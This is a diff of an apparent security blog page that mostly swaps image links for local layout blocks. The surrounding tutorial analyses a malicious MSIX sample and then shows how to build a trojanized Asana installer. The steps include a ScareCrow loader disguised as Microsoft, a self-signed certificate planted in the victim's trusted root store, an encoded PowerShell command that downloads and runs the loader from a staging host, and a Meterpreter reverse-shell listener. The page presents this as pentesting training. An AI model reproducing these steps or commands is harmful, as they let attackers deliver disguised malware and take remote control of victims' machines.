@@ -25,6 +25,29 @@
    <!---  <link rel="stylesheet" href="https://devopsengineerdan.github.io/assets/css/note.css" />  --->
    <!---  <link rel="stylesheet" href="https://devopsengineerdan.github.io/assets/js/note.js" />  --->
 
+
+
+
+    
+      <!-- Favicons 
+    <link href="https://devopsengineerdan.github.io/assets/img/apple-touch-icon.png" rel="apple-touch-icon" />
+
+    <!-- Google Fonts 
+    <link href="https://devopsengineerdan.github.io/assets/vendor/google/css/icons.css" rel="stylesheet" />
+
+<!-- Vendor CSS Files   -->
+   <link href="https://devopsengineerdan.github.io/assets/vendor/aos/aos.css" rel="stylesheet" /> 
+ <!--    <link href="https://devopsengineerdan.github.io/assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet" /> -->
+  <!--  <link
+      href="https://devopsengineerdan.github.io/assets/vendor/glightbox/css/glightbox.min.css"
+      rel="stylesheet"
+    />
+    <link href="https://devopsengineerdan.github.io/assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet" /> 
+
+
+    <!-- Template Main CSS File  
+    <link href="https://devopsengineerdan.github.io/assets/assets/css/style.css" rel="stylesheet" />   -->
+    
   </head>
   <body>
     
@@ -99,7 +122,30 @@
     </header>
     <div class="post-content">
       <hr>
-<p><img src="https://github.com/user-attachments/assets/29621ee8-2024-4789-b61b-7aab24927f0d" alt="msix1"></p>
+
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix1.png" 
+                  class="img-fluid"
+                  alt="msix1"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
+
 <blockquote>
 <h3 id="table-of-contents">Table of Contents</h3>
 </blockquote>
@@ -177,7 +223,29 @@
 <p>The general MSIX file format can be deconstructed as shown:</p>
 </li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/0dfcff2d-459c-4ae2-8fa7-02691754650b" alt="msix2"></p>
+
+ <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix2.png" 
+                  class="img-fluid"
+                  alt="msix2"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
+      
 <h3 id="package-payload">Package Payload</h3>
 <ul>
 <li><code>Application Files</code>: This section contains the necessary applications required for the packaged application to run. These can be EXEs, DLLs, Config files, resource files or any other type of file.</li>
@@ -194,7 +262,28 @@
 <li>The <code>Package Support Framework (PSF)</code>, is an open source kit in windows designed to facilitate installation and operation of applications in Windows. It helps one apply fixes to an application without modifying code.</li>
 <li>It allows for extensive configuration to tailor the behaviour of applications. This customization allows resolving of specific compatibility issues without needing to modify the original code.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/f2c7cabe-6330-4bd1-a58d-e11b0a5f2d6e" alt="msix3"></p>
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix3.png" 
+                  class="img-fluid"
+                  alt="msix3"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>
 <p>In the diagram above, we see the interaction between the PSF and the packaged application at runtime. Let’s discuss the various components.</p>
@@ -217,7 +306,28 @@
 <li>Let us look at a malicious <a href="https://bazaar.abuse.ch/verify-ua/">sample</a> from malwarebazaar.</li>
 <li>Once you’ve downloaded and unzipped the sample, you will be presented with the following folder structure.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/8657d334-40b2-44bd-bce6-6fddaa93548f" alt="msix4"></p>
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix4.png" 
+                  class="img-fluid"
+                  alt="msix4"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>
 <p>In this example, the packaged msix does not contain the target application being installed (it was probably omitted by the original poster) but, it utilizes the Package Support Framework. We can see the psflauncher and the necessary DLLs to ensure its correct functionality. So we know that the malware is going to be executing a script when it is installed on a system.</p>
@@ -236,7 +346,30 @@
 <ul>
 <li>I highlighted 2 important sections here. The properties and the applications section.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/13fdc262-1d82-4e06-a7a9-b6b35aa1d40c" alt="msix5"></p>
+
+
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix5.png" 
+                  class="img-fluid"
+                  alt="msix5"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>The <code>properties</code> section contains details identifying the application such as the name, description and the logo that the app uses.</li>
 <li>In the <code>applications</code> section, we can see the PSF executable being launched. There is also a notepad shortcut being created in the common programs folder.</li>
@@ -246,7 +379,28 @@
 <ul>
 <li>This is where things start to get interesting. We can see the various parameters being used in the configuration</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/07e29470-cc18-4176-be78-c66130ff22a5" alt="msix6"></p>
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix6.png" 
+                  class="img-fluid"
+                  alt="msix6"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ol>
 <li>The PSF executable will be launched.</li>
 <li><code>scriptExecutionMode</code> has been set to <code>RemoteSigned</code>, which allows scripts that are downloaded from the internet to run if signed by a trusted publisher.</li>
@@ -257,7 +411,28 @@
 <ul>
 <li>The <code>StartingScriptWrapper</code> is required by the PSF to be able to run the target script. The file below is included by default without any special modifications.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/7ccdd0c6-1211-45f7-9598-de608f6c0d31" alt="msix7"></p>
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix7.png" 
+                  class="img-fluid"
+                  alt="msix7"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <h3 id="usjzy-the-target-script">usJzY The Target Script</h3>
 <ul>
 <li>Finally, we have the target script that is being executed by PSF.</li>
@@ -368,7 +543,29 @@ Receive<span style="color:#f92672">-</span>Job <span style="color:#f92672">-</sp
 <ul>
 <li>First, you will need to install the <code>MSIX packaging tool</code> from the Microsoft Store.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/7dbce949-2533-4cad-a1a8-f8a3f749569d" alt="msix8"></p>
+
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix8.png" 
+                  class="img-fluid"
+                  alt="msix8"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>You will also need the target application being packaged. I used Asana for this example.</li>
 </ul>
@@ -382,11 +579,56 @@ Receive<span style="color:#f92672">-</span>Job <span style="color:#f92672">-</sp
 <li>Then generate the loader using Scarecrow.</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">./scarecrow <span style="color:#f92672">-</span>I protection.bin <span style="color:#f92672">-</span>domain www.microsoft.com <span style="color:#f92672">-</span>encryptionmode AES
-</code></pre></div><p><img src="https://github.com/user-attachments/assets/93b4e2a2-616e-4253-9362-acf0273d7910" alt="msix9"></p>
+</code></pre></div>
+      
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix9.png" 
+                  class="img-fluid"
+                  alt="msix9"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
+      
 <ul>
 <li>Host the final loader.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/488febe7-dc68-46c8-ac93-a63680a57d77" alt="msix10"></p>
+
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix10.png" 
+                  class="img-fluid"
+                  alt="msix10"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <h3 id="create-an-ssl-certificate">Create an SSL certificate</h3>
 <ul>
 <li>When running the MSIX file, Windows will check for the <code>digital signature</code> of the file to ensure it is legitimate and has not been tampered with. If you were to create an MSIX file without signing it, Windows will throw an error to you rejecting the installation process.</li>
@@ -411,42 +653,278 @@ Export<span style="color:#f92672">-</span>PfxCertificate <span style="color:#f92
 <li>Export the public key which we will install in the victim’s computer</li>
 </ol>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">Export<span style="color:#f92672">-</span>Certificate <span style="color:#f92672">-</span>cert <span style="color:#e6db74">&#34;Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BBE95D792&#34;</span> <span style="color:#f92672">-</span>FilePath <span style="color:#e6db74">&#39;C:\Users\Saudi\cert.cer&#39;</span>
-</code></pre></div><p><img src="https://github.com/user-attachments/assets/1d359d10-934b-4d8f-9d80-80a17ba83122" alt="msix11"></p>
+</code></pre></div>
+      
+      
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix11.png" 
+                  class="img-fluid"
+                  alt="msix11"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
+      
 <ul>
 <li>Since this is a self-signed SSL for testing purposes, you can install the security certificate on the victim as shown:</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/472506d4-908e-4b88-9f93-4c5387878582" alt="msix12"></p>
-<p><img src="https://github.com/user-attachments/assets/e9cb4135-88c0-4063-a104-8e01ac0be8f5" alt="msix13"></p>
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix12.png" 
+                  class="img-fluid"
+                  alt="msix12"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix13.png" 
+                  class="img-fluid"
+                  alt="msix13"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>Install the cert in the Trusted Root Certification Authorities.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/8e610224-54a8-4b56-b707-b2b8fe8ad764" alt="msix14"></p>
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix14.png" 
+                  class="img-fluid"
+                  alt="msix14"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <h3 id="bundle-the-package-and-stage-our-loader">Bundle the package and stage our loader</h3>
 <ul>
 <li>Select the task and follow through the prompts</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/5a1bda1e-473f-4166-9e42-71ed27a90b4a" alt="msix15"></p>
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix15.png" 
+                  class="img-fluid"
+                  alt="msix15"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>Select the Asana setup file as the installer being packaged and select the pfx certificate we generated.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/b4a80e28-213e-40e4-be4b-796179b1badd" alt="msix16"></p>
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix16.png" 
+                  class="img-fluid"
+                  alt="msix16"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>You can skip the Accelerator section. The package will automatically install in the system as shown.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/178734e3-2caa-4322-9a49-9370c3497f5c" alt="msix17"></p>
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix17.png" 
+                  class="img-fluid"
+                  alt="msix17"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>Ensure the package has an entry point as shown. We will edit the entry point in the manifest file later on to point to our psflauncher executable.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/ecad109a-9e98-4dc3-96ba-f9a006c081bf" alt="msix18"></p>
+
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix18.png" 
+                  class="img-fluid"
+                  alt="msix18"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>Here in the Create New Package Section, we go to the package editor to add the PSF binaries and config file to our package to give it PSF support.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/093ba4d5-8081-4653-ab18-8a956d5df20a" alt="msix19"></p>
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix19.png" 
+                  class="img-fluid"
+                  alt="msix19"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>In the package editor, click on package files, right-click on the “Package” and add the following appropriate files.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/ba54db86-765a-492f-9ead-2bc259dcd86d" alt="msix20"></p>
-<p><img src="https://github.com/user-attachments/assets/9482cf66-032b-4f62-b6fd-7fbdbf388c47" alt="msix21"></p>
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix20.png" 
+                  class="img-fluid"
+                  alt="msix20"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix21.png" 
+                  class="img-fluid"
+                  alt="msix21"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
+
 <ul>
 <li>You can edit files directly in the package editor by right-clicking and selecting edit. Let’s modify the config file to point to our staging script called Hotfix.ps1. In this example, I enabled the powershell window to debug any errors.</li>
 </ul>
@@ -469,24 +947,132 @@ Export<span style="color:#f92672">-</span>PfxCertificate <span style="color:#f92
 </code></pre></div><ul>
 <li>Create the <code>hotfix.ps1</code> file in a different window. We will add a powershell command that pulls our loader from the staging server and executes it.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/7f27e44c-9d03-47e8-9a63-7b9fb47e95fa" alt="msix22"></p>
+
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix22.png" 
+                  class="img-fluid"
+                  alt="msix22"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">powershell <span style="color:#f92672">-</span>enc <span style="color:#e6db74">&#34;dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADcANQAuADEAMgA4AC8AMgA0ADoAOQAwADAAMQAvAEgAbwB0AGYAaQB4AC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADUAOwBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA=&#34;</span>
 </code></pre></div><ul>
 <li>Add the <code>hotfix.ps1</code> staging script.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/812e7559-2432-4c76-902e-15e6c7c75c69" alt="msix23"></p>
+
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix23.png" 
+                  class="img-fluid"
+                  alt="msix23"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>Back to the manifest file, let’s change the launch executable to our PSF binary so that the hotfix.ps1 can be executed post install.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/dfc715ea-23b0-489f-a08d-4c3f6046575f" alt="msix24"></p>
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix24.png" 
+                  class="img-fluid"
+                  alt="msix24"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>In this section, take note of the Application ID defined. We will also modify the executable value.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/ee9660d2-391c-4f20-9c91-41bc06b929ea" alt="msix25"></p>
+
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix25.png" 
+                  class="img-fluid"
+                  alt="msix25"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>Change it to point to the psf executable:</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/1d23ac8d-fe99-4308-9880-18486872435f" alt="msix26"></p>
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix26.png" 
+                  class="img-fluid"
+                  alt="msix26"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>Save and exit. Finally create your MSIX file.</li>
 </ul>
@@ -494,16 +1080,83 @@ Export<span style="color:#f92672">-</span>PfxCertificate <span style="color:#f92
 <blockquote>
 <p><strong>Alert</strong> <code>Ensure that the Asana application is not installed in the system</code></p>
 </blockquote>
-<p><img src="https://github.com/user-attachments/assets/a3c179c8-fb21-4dae-9b31-b35074c37be5" alt="msix27"></p>
+
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix27.png" 
+                  class="img-fluid"
+                  alt="msix27"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>Setup our listener.</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">msfconsole <span style="color:#f92672">-</span>qx <span style="color:#e6db74">&#34;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.71;set LPORT 9001; set EXITFUNC thread; set EXITONSESSION false; exploit -j&#34;</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;&amp;</span><span style="color:#ae81ff">1</span>
-</code></pre></div><p><img src="https://github.com/user-attachments/assets/6c698052-9a7c-4657-82c8-d9a55f9d8462" alt="msix28"></p>
+</code></pre></div>
+      
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix28.png" 
+                  class="img-fluid"
+                  alt="msix28"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
+      
 <ul>
 <li>Run the MSIX installation and catch your shell.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/80617c17-d3dd-4465-aafc-fb2a9e7b67dc" alt="msix29"></p>
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/msix29.png" 
+                  class="img-fluid"
+                  alt="msix29"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>Happy pentesting!</li>
 </ul>
@@ -572,5 +1225,24 @@ Export<span style="color:#f92672">-</span>PfxCertificate <span style="color:#f92
         </script>
         <script id="dsq-count-scr" src="//engineer-dancun.disqus.com/count.js" async></script>
     </main>
+
+
+
+
+    
+
+    <!-- Vendor JS Files -->
+    <script src="https://devopsengineerdan.github.io/assets/vendor/purecounter/purecounter_vanilla.js"></script>
+    <script src="https://devopsengineerdan.github.io/assets/vendor/aos/aos.js"></script>
+    <script src="https://devopsengineerdan.github.io/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script src="https://devopsengineerdan.github.io/assets/vendor/glightbox/js/glightbox.min.js"></script>
+    <script src="https://devopsengineerdan.github.io/assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
+    <script src="https://devopsengineerdan.github.io/assets/vendor/swiper/swiper-bundle.min.js"></script>
+    <!-- <script src="https://devopsengineerdan.github.io/assets/vendor/waypoints/noframework.waypoints.js"></script> -->
+	  
+    <!-- Template Main JS File -->
+    <script src="https://devopsengineerdan.github.io/assets/js/main.js"></script>
+
+    
   </body>
 </html>
